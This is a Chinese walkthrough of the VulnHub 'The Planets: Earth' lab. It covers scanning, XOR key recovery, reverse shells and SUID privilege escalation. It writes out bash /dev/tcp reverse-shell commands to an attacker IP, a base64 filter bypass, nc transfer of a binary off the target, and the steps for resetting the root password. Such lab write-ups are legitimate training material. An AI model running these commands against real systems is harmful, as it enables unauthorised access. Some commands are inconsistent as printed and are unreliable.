靶场搭建

靶机下载地址：The Planets: Earth ~ VulnHub

直接解压双击 ova 文件即可导入。建议使用 VirtualBox（官方推荐），攻击机使用 Kali Linux。难度：简单。

信息收集

端口扫描

先明确靶机 IP，然后使用 nmap 扫描：

nmap -A -T4 -p- 192.168.21.145

扫描结果中有一个关键信息：

Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
DNS 解析

修改 /etc/hosts 文件，添加 IP 与域名的映射：

vim /etc/hosts

添加以下内容：

192.168.21.145 earth.local
192.168.21.145 terratest.earth.local

XOR 解密

根据 XOR 运算性质 a XOR b XOR a = b，在本靶机中 a 为 message，b 为 message key，a XOR b 为 previous message。只要用 previous message 和 message 做一次 XOR 运算，即可得到 message key。

从 earth.local 页面已知 3 个 previous message，从 testingnotes.txt 已知 testdata.txt 至少做过一次 message。用 testdata.txt 的内容和 3 个 previous message 分别进行 XOR 操作，发现第 3 条是 testdata.txt 内容与 message key 进行 XOR 运算的结果：

反弹 Shell

尝试直接反弹 shell 被 ban：

bash -c 'exec bash -i &>/dev/tcp/192.168.21.134/666 <&1'

使用 base64 编码绕过。用 Burp 抓包：

对 payload 进行 base64 编码：

echo 'bash -i >& /dev/tcp/192.168.21.134/8888 0>&1'>/tmp/1|base64 -d|sh

权限提升

连接完成后搜索 SUID 文件：

find / -user root -perm /4000 2>/dev/null

发现一个可疑的 /usr/bin/reset_root。

SUID 分析

查看可读内容：

strings /usr/bin/reset_root

可见该可执行文件将 root 密码修改为 Earth。

直接执行发现失败，需要触发条件：

ltrace 分析

靶机上没有 ltrace，需要将 /usr/bin/reset_root 传到攻击机分析。使用 nc 传输：

攻击机监听：

nc -nlvp 2222 > reset_root

靶机发送：

nc 192.168.101.34 2222 < /usr/bin/reset_root

攻击机上赋予执行权限并用 ltrace 跟踪：

chmod +x reset_root
ltrace ./reset_root

发现触发条件是需要同时存在三个文件：/dev/shm/kHgTFI5G、/dev/shm/Zw7bV9U5、/tmp/kcM0Wewe。

获取 Root 权限

在靶机上创建这三个文件：

touch /tmp/kcM0Wewe
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
/usr/bin/reset_root

执行成功，root 密码被修改为 Earth。

使用 su 提权到 root，密码为 Earth，并在 /root 目录下获得 flag：
